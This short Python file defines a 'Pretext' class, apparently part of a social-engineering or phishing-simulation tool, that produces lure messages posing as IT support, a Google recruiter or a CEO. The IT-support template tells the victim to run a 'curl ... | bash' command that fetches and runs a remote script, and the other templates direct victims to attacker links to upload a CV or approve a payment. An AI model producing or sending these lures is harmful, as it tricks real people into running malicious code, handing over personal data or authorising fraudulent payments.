class Pretext:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P2"
        self.level = "Hard"

    def generate(self, target, scenario="it_support"):
        pretexts = {
            "it_support": f"""
            I'm from IT support. We detected a virus on your machine.
            Please run this command to fix it: curl {target}/fix.sh | bash
            """,
            "recruiter": f"""
            Hi, I'm a recruiter from Google.
            We're impressed with your profile. Please upload your CV here: {target}/apply
            """,
            "executive": f"""
            This is the CEO. I need you to approve this payment urgently.
            Click here: {target}/approve
            """,
        }
        return {"pretext": pretexts.get(scenario, pretexts["it_support"])}
